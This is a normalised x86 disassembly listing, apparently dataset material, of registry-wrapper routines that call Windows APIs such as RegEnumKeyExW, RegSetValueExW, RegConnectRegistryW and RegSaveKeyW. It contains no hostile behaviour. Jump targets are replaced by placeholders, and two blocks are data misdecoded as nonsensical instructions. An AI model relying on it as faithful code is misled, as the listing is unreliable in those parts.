mov eax ebx
call sub_444b58
pop esi
pop ebx
retn
sub_4451a8
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
xor ecx ecx
mov edx 0x1c
call sub_404c14
lea eax [ ebx + 0x14 ]
push eax
push 0x0
lea eax [ ebx + 0x10 ]
push eax
lea eax [ ebx + 0xc ]
push eax
lea eax [ ebx + 0x8 ]
push eax
push 0x0
lea eax [ ebx + 0x4 ]
push eax
push ebx
push 0x0
push 0x0
push 0x0
mov eax [ esi + 0x4 ]
push eax
call RegQueryInfoKeyW
mov edx eax
mov eax esi
call sub_444b58
mov edx [ rw-data ]
cmp [ edx + 0xc ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov edx [ rw-data ]
cmp [ edx ] 0x2
jne r-xdata
mov edx [ ebx + 0x4 ]
add [ ebx + 0x4 ] edx
mov edx [ ebx + 0xc ]
add [ ebx + 0xc ] edx
sub_445214
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] edx
mov edi eax
xor eax eax
push ebp
push sub_4452cc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x44 ]
lea edx [ ebp - 0x28 ]
mov eax edi
call sub_4451a8
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4452d3
lea eax [ ebp - 0x2c ]
call j_sub_4068a0
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
mov ecx [ ebp - 0x24 ]
inc ecx
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_4071e4
mov ebx [ ebp - 0x28 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp - 0x24 ]
inc eax
mov [ ebp - 0xc ] eax
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
call sub_407134
push eax
push esi
mov eax [ edi + 0x4 ]
push eax
call RegEnumKeyExW
mov eax [ ebp - 0x4 ]
call sub_407134
mov edx eax
lea eax [ ebp - 0x2c ]
call sub_407254
mov edx [ ebp - 0x2c ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
inc esi
dec ebx
jne r-xdata
sub_4452dc
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0x1c ]
test edi edi
je r-xdata
mov eax esi
xor edx edx
call sub_4070a8
mov edx esi
mov eax edi
call sub_415718
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_44542f
dec [ 0x48000000 ]
add [ ebx ] cl
inc ebp
add [ ecx ] bl
pop edi
add [ eax + eax + 0x59 ] al
add [ esi ] cl
pop edi
add [ eax + eax + 0x41 ] al
add [ eax + eax + 0x41 ] dl
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x8 ]
cmp esi 0x80000000
jb r-xdata
mov eax edi
xor edx edx
call sub_4070a8
cmp esi 0x80000006
ja r-xdata
mov eax edi
mov edx [ esi * 4 + rw-data ]
call sub_4070a8
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_445488
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] edx
mov edi eax
xor eax eax
push ebp
push sub_445540
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x44 ]
lea edx [ ebp - 0x28 ]
mov eax edi
call sub_4451a8
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_445547
lea eax [ ebp - 0x2c ]
call j_sub_4068a0
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
mov ecx [ ebp - 0x1c ]
inc ecx
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_4071e4
mov ebx [ ebp - 0x20 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp - 0x1c ]
inc eax
mov [ ebp - 0xc ] eax
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
call sub_407134
push eax
push esi
mov eax [ edi + 0x4 ]
push eax
call RegEnumValueW
mov eax [ ebp - 0x4 ]
call sub_407134
mov edx eax
lea eax [ ebp - 0x2c ]
call sub_407254
mov edx [ ebp - 0x2c ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
inc esi
dec ebx
jne r-xdata
sub_445550
push ebx
push esi
push edi
push ecx
mov esi ecx
mov edi edx
mov ebx eax
mov eax esi
xor ecx ecx
mov edx 0x8
call sub_404c14
lea eax [ esi + 0x4 ]
push eax
push 0x0
lea eax [ esp + 0x8 ]
push eax
push 0x0
mov eax edi
call sub_407134
push eax
mov eax [ ebx + 0x4 ]
push eax
call RegQueryValueExW
mov edx eax
mov eax ebx
call sub_444b58
mov ebx eax
mov eax [ esp ]
call sub_444934
mov [ esi ] al
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
sub_4455a4
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
call sub_445550
test al al
je r-xdata
or eax 0xffffffff
mov eax [ esp + 0x4 ]
jmp r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
sub_4455cc
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
call sub_445550
test al al
je r-xdata
xor eax eax
movzx eax [ esp ]
jmp r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
sub_4455f4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov eax [ ebp - 0x4 ]
call j_sub_406bfc
xor eax eax
push ebp
push sub_445671
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov ebx eax
test ebx ebx
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
inc ebx
mov eax ebx
add eax eax
push eax
push 0x1
mov eax [ ebp - 0x4 ]
call sub_407134
mov ecx eax
mov edx edi
mov eax esi
call sub_445b80
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_445678
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
sub ebx 0x4
mov ebx [ ebx ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_406a50
sub_445680
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov eax [ ebp - 0x4 ]
call j_sub_406bfc
xor eax eax
push ebp
push sub_4456fd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov ebx eax
test ebx ebx
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
inc ebx
mov eax ebx
add eax eax
push eax
push 0x2
mov eax [ ebp - 0x4 ]
call sub_407134
mov ecx eax
mov edx edi
mov eax esi
call sub_445b80
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_445704
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
sub ebx 0x4
mov ebx [ ebx ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_406a50
sub_44570c
push ebx
push esi
push edi
push ebp
push ecx
mov edi ecx
mov ebp edx
mov esi eax
mov edx ebp
mov eax esi
call sub_4455a4
mov ebx eax
test ebx ebx
jle r-xdata
mov eax edi
xor edx edx
call sub_4070a8
mov ecx ebx
sar ecx 0x1
jns r-xdata
mov eax edi
xor edx edx
call sub_4071e4
push ebx
lea eax [ esp + 0x4 ]
push eax
mov eax [ edi ]
call sub_407134
mov ecx eax
mov edx ebp
mov eax esi
call sub_445bf4
cmp [ esp ] 0x1
je r-xdata
adc ecx 0x0
mov eax [ edi ]
call sub_407134
call sub_412550
mov edx eax
mov eax edi
call sub_40740c
jmp r-xdata
cmp [ esp ] 0x2
jne r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_444864
jmp r-xdata
sub_44578d
push edi
inc esp
add [ ecx ] dl
or eax 0x6552543a
imul esi [ bp + di + 0x74 ] 0x3a2e7972
xor al [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] dl
add [ eax ] al
add [ eax + edx + 0x52080040 ] dh
imul esi [ gs : bp + di + 0x74 ] 0x10b47972
inc eax
add [ edx ] al
add [ ebx - 0x1374aa40 ] cl
add esp 0xffffffec
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x5 ] cl
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_445931
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
xor edx edx
call sub_4070a8
lea ecx [ ebp - 0x10 ]
mov edx edi
mov eax ebx
call sub_445550
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_445938
lea eax [ ebp - 0x14 ]
call j_sub_4068a0
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_408928
retn
cmp [ ebp - 0xc ] 0x0
jle r-xdata
movzx eax [ ebp - 0x10 ]
sub al 0x1
jb r-xdata
mov eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_40891c
add esp 0x4
mov eax [ ebp - 0xc ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_445b1c
cmp [ ebp - 0x5 ] 0x0
je r-xdata
sub al 0x2
jb r-xdata
push esi
mov eax [ ebp - 0x4 ]
call sub_40875c
mov edx eax
xor ecx ecx
mov eax [ ebp - 0x4 ]
call sub_44495c
push esi
mov eax [ ebp - 0x4 ]
call sub_40875c
mov edx eax
mov ecx r-xdata
mov eax [ ebp - 0x4 ]
call sub_44495c
jmp r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
xor edx edx
call sub_4071e4
mov eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ esi ]
call sub_407134
mov ecx eax
mov edx edi
mov eax ebx
call sub_445bf4
mov eax [ esi ]
call sub_407134
call sub_412550
mov edx eax
mov eax esi
call sub_40740c
jmp r-xdata
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
dec al
je r-xdata
mov edx edi
mov eax ebx
call sub_44598c
mov edx esi
call sub_411914
jmp r-xdata
mov edx edi
mov eax ebx
call sub_44598c
lea ecx [ ebp - 0x14 ]
mov edx 0x8
call sub_411b48
mov ecx [ ebp - 0x14 ]
mov eax esi
mov edx r-xdata
call sub_407564
jmp r-xdata
jmp r-xdata
sub_44598c
push ebx
add esp 0xfffffff8
mov ebx edx
push 0x4
lea edx [ esp + 0x8 ]
push edx
lea ecx [ esp + 0x8 ]
mov edx ebx
call sub_445bf4
cmp [ esp + 0x4 ] 0x3
je r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop ebx
retn
mov eax ebx
call sub_444864
sub_4459f4
push ebx
add esp 0xfffffff4
mov ebx edx
push 0x8
lea edx [ esp + 0xc ]
push edx
lea ecx [ esp + 0x8 ]
mov edx ebx
call sub_445bf4
cmp [ esp + 0x8 ] 0x4
jne r-xdata
mov eax ebx
call sub_444864
cmp eax 0x8
je r-xdata
fld [ esp ]
add esp 0xc
pop ebx
retn
sub_445a3c
push ebx
add esp 0xfffffff4
mov ebx edx
push 0x8
lea edx [ esp + 0xc ]
push edx
lea ecx [ esp + 0x8 ]
mov edx ebx
call sub_445bf4
cmp [ esp + 0x8 ] 0x4
jne r-xdata
mov eax ebx
call sub_444864
cmp eax 0x8
je r-xdata
fild [ esp ]
add esp 0xc
pop ebx
retn
sub_445a84
push ebx
add esp 0xfffffff4
mov ebx edx
push 0x8
lea edx [ esp + 0xc ]
push edx
lea ecx [ esp + 0x8 ]
mov edx ebx
call sub_445bf4
cmp [ esp + 0x8 ] 0x4
jne r-xdata
mov eax ebx
call sub_444864
cmp eax 0x8
je r-xdata
fld [ esp ]
add esp 0xc
pop ebx
retn
sub_445b1c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov edi edx
mov ebx eax
lea ecx [ ebp - 0x14 ]
mov edx edi
mov eax ebx
call sub_445550
test al al
je r-xdata
xor esi esi
mov esi [ ebp - 0x10 ]
movzx eax [ ebp - 0x14 ]
mov [ ebp - 0x9 ] al
cmp [ ebp - 0x9 ] 0x4
je r-xdata
cmp esi [ ebp + 0x8 ]
jg r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov eax edi
call sub_444864
jmp r-xdata
push esi
lea eax [ ebp - 0x9 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx edi
mov eax ebx
call sub_445bf4
jmp r-xdata
mov eax esi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_445b80
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
movzx eax [ ebp + 0x8 ]
call sub_444904
mov esi eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push esi
push 0x0
mov eax edi
call sub_407134
push eax
mov eax [ ebx + 0x4 ]
push eax
call RegSetValueExW
mov edx eax
mov eax ebx
call sub_444b58
test al al
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] 0x11
lea eax [ ebp - 0xc ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4162b0
call sub_4060b0
sub_445bf4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
lea eax [ ebp + 0xc ]
push eax
push edi
lea eax [ ebp - 0x4 ]
push eax
push 0x0
mov eax esi
call sub_407134
push eax
mov eax [ ebx + 0x4 ]
push eax
call RegQueryValueExW
mov edx eax
mov eax ebx
call sub_444b58
test al al
jne r-xdata
mov ebx [ ebp + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_444934
mov edx [ ebp + 0x8 ]
mov [ edx ] al
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov [ ebp - 0xc ] esi
mov [ ebp - 0x8 ] 0x11
lea eax [ ebp - 0xc ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4162b0
call sub_4060b0
sub_445c70
push ebx
add esp 0xffffffe4
mov ebx eax
mov edx esp
mov eax ebx
call sub_4451a8
test al al
je r-xdata
xor eax eax
jmp r-xdata
cmp [ esp ] 0x0
jg r-xdata
add esp 0x1c
pop ebx
retn
mov al 0x1
sub_445ca4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_445d2a
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_4070fc
mov eax [ ebp - 0x4 ]
call sub_444890
mov ebx eax
test bl bl
jne r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x8 ]
push eax
mov eax [ esi + 0x18 ]
push eax
push 0x0
mov eax [ ebp - 0x4 ]
call sub_407134
push eax
mov edx ebx
mov eax esi
call sub_444be4
push eax
call RegOpenKeyExW
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_445d31
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx 0x1
call sub_4078a0
sub_445d3c
push ebx
push esi
push ecx
mov ebx edx
mov esi eax
push esp
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_407134
push eax
call RegConnectRegistryW
mov edx eax
mov eax esi
call sub_444b58
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edx
pop esi
pop ebx
retn
mov edx [ esp ]
mov eax esi
call sub_444b94
mov [ esi + 0x14 ] 0x1
sub_445d78
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_445df7
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_4070fc
mov eax [ ebp - 0x4 ]
call sub_444890
test al al
jne r-xdata
mov eax edi
call sub_407134
push eax
mov eax [ ebp - 0x4 ]
call sub_407134
push eax
mov eax [ ebx + 0x8 ]
push eax
call RegLoadKeyW
mov edx eax
mov eax ebx
call sub_444b58
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_445dfe
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx 0x1
call sub_4078a0
sub_445e08
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_445e7c
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_4070fc
mov eax [ ebp - 0x4 ]
call sub_444890
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_407134
push eax
mov eax [ ebx + 0x8 ]
push eax
call RegUnLoadKeyW
mov edx eax
mov eax ebx
call sub_444b58
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_445e83
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx 0x1
call sub_4078a0
sub_445e8c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov esi ecx
mov ebx eax
mov [ ebp - 0x1 ] 0x0
mov eax ebx
call sub_445ca4
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
movzx eax [ ebp - 0x1 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
xor eax eax
push ebp
push sub_445ef0
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
mov eax esi
call sub_407134
push eax
mov eax [ ebp - 0x8 ]
push eax
call RegRestoreKeyW
mov edx eax
mov eax ebx
call sub_444b58
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
call RegCloseKey
retn
sub_445f04
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_445f94
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_4070fc
mov eax [ ebp - 0x4 ]
call sub_444890
mov ebx eax
test bl bl
jne r-xdata
mov eax [ ebp + 0x8 ]
call sub_407134
push eax
mov eax edi
call sub_407134
push eax
mov eax [ ebp - 0x4 ]
call sub_407134
push eax
mov edx ebx
mov eax esi
call sub_444be4
push eax
call RegReplaceKeyW
mov edx eax
mov eax esi
call sub_444b58
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_445f9b
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx 0x1
call sub_4078a0
sub_445fa8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov esi ecx
mov ebx eax
mov [ ebp - 0x1 ] 0x0
mov eax ebx
call sub_445ca4
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
movzx eax [ ebp - 0x1 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
xor eax eax
push ebp
push sub_44600c
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
mov eax esi
call sub_407134
push eax
mov eax [ ebp - 0x8 ]
push eax
call RegSaveKeyW
mov edx eax
mov eax ebx
call sub_444b58
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
call RegCloseKey
retn
sub_446020
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_446085
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
and eax 0x300
or eax 0x20009
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x18 ] eax
mov eax [ ebp - 0x4 ]
call sub_445ca4
mov ebx eax
test ebx ebx
je r-xdata
test ebx ebx
setne [ ebp - 0x5 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44608c
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x18 ] edx
retn
push ebx
call RegCloseKey
sub_446098
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov edx edi
mov eax ebx
call sub_445c94
test al al
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_4455a4
mov esi eax
test esi esi
jle r-xdata
mov eax esi
call sub_4041ec
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_446123
push [ fs : eax ]
mov [ fs : eax ] esp
push esi
lea eax [ ebp - 0x5 ]
push eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_445bf4
mov esi eax
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_445184
push esi
movzx eax [ ebp - 0x5 ]
push eax
mov ecx [ ebp - 0xc ]
mov edx edi
mov eax ebx
call sub_445b80
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_404220
retn
sub_446134
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x4 ]
mov [ ebp - 0x8 ] edx
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
xchg edx eax
call sub_444bf8
xor eax eax
push ebp
push sub_446247
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_4455a4
mov ebx eax
test ebx ebx
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44624e
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x8 ]
call sub_444bf8
retn
mov eax ebx
call sub_4041ec
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_446224
push [ fs : eax ]
mov [ fs : eax ] esp
push ebx
lea eax [ ebp - 0x11 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x10 ]
mov edx esi
call sub_445bf4
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_444bf8
xor eax eax
push ebp
push sub_446207
push [ fs : eax ]
mov [ fs : eax ] esp
push ebx
movzx eax [ ebp - 0x11 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x10 ]
mov edx esi
call sub_445b80
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44620e
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0xc ]
call sub_444bf8
retn
sub_446254
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] edx
mov esi eax
xor eax eax
push ebp
push sub_44637c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_444bf8
xor eax eax
push ebp
push sub_446357
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x2c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4451a8
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44635e
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x10 ]
call sub_444bf8
retn
mov eax [ ebp + 0x8 ]
push eax
xor ecx ecx
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_446134
pop ecx
mov ecx [ ebp - 0x20 ]
inc ecx
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_4071e4
mov ebx [ ebp - 0x24 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_407134
mov edx eax
lea eax [ ebp - 0x30 ]
call sub_407254
mov ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_446134
pop ecx
mov eax [ ebp - 0x20 ]
inc eax
mov [ ebp - 0xc ] eax
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
call sub_407134
push eax
push edi
push esi
call RegEnumValueW
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_444b58
test al al
je r-xdata
sub_44638c
push ebp
mov ebp esp
add esp 0xffffffb0
xor ecx ecx
mov [ ebp - 0x50 ] ecx
mov [ ebp - 0x4c ] ecx
mov [ ebp - 0x48 ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4465da
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x8 ]
call sub_444bf8
xor eax eax
push ebp
push sub_4465b0
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x44 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4451a8
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4465b7
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x18 ]
call sub_444bf8
retn
mov ecx [ ebp - 0x40 ]
inc ecx
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_4071e4
mov eax [ ebp - 0x44 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x14 ] 0x0
inc [ ebp - 0x14 ]
dec [ ebp - 0x28 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_407134
mov edx eax
lea eax [ ebp - 0x48 ]
call sub_407254
mov edx [ ebp - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_445ca4
mov [ ebp - 0x20 ] eax
cmp [ ebp - 0x20 ] 0x0
je r-xdata
mov eax [ ebp - 0x40 ]
inc eax
mov [ ebp - 0x10 ] eax
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_407134
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call RegEnumKeyExW
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_444b58
test al al
je r-xdata
xor eax eax
push ebp
push sub_446581
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0xc ]
call sub_444bf8
xor eax eax
push ebp
push sub_446563
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_407134
mov edx eax
lea eax [ ebp - 0x4c ]
call sub_407254
